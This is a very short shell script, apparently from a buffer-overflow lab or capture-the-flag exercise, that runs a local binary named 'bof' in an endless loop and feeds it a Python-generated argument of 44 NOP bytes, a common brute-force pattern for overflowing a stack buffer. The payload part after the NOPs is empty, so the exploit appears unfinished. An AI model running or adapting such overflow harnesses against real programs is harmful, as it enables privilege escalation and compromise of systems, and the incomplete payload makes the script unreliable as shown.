#!/bin/sh 

while : 
do
	./bof `python -c "print '\x90' * 44 + ''"`
done	
